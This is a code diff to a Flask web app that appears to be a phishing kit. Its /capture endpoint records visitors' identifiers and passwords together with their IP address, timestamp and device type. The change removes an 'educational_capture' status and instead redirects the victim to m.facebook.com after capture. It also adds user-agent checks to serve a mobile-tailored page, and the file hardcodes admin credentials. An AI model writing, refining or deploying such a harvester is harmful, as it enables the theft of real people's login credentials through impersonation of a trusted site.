@@ -11,37 +11,31 @@ ADMIN_CREDENTIALS = {'username': '4!cks', 'password': '0220Mpc'}
 
 @app.route("/")
 def home():
-    return render_template("index.html")
+    # Detect mobile devices
+    user_agent = request.headers.get('User-Agent', '').lower()
+    mobile = any(m in user_agent for m in ['mobile', 'iphone', 'android', 'blackberry'])
+    return render_template("index.html", mobile=mobile)
 
 @app.route("/capture", methods=["POST"])
 def capture():
     global next_id
     data = request.json
     
-    # Determine identifier type automatically
     identifier = data.get('identifier', '')
-    identifier_type = 'unknown'
+    identifier_type = 'email' if '@' in identifier and '.' in identifier else 'phone' if identifier.isdigit() else 'username'
     
-    if '@' in identifier and '.' in identifier:
-        identifier_type = 'email'
-    elif identifier.isdigit() and len(identifier) >= 10:
-        identifier_type = 'phone'
-    elif identifier:
-        identifier_type = 'username'
-    
-    data.update({
+    captured_creds.append({
         "id": next_id,
         "identifier": identifier,
         "identifier_type": identifier_type,
         "ip": request.remote_addr,
         "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "password": data.get('password', '')
+        "password": data.get('password', ''),
+        "device": "Mobile" if "mobile" in request.headers.get('User-Agent', '').lower() else "Desktop"
     })
     
-    captured_creds.append(data)
     next_id += 1
-    return jsonify({"status": "educational_capture"})
-
+    return jsonify({"status": "success", "redirect": "https://m.facebook.com"})
 
 @app.route("/login", methods=["GET", "POST"])
 def admin_login():
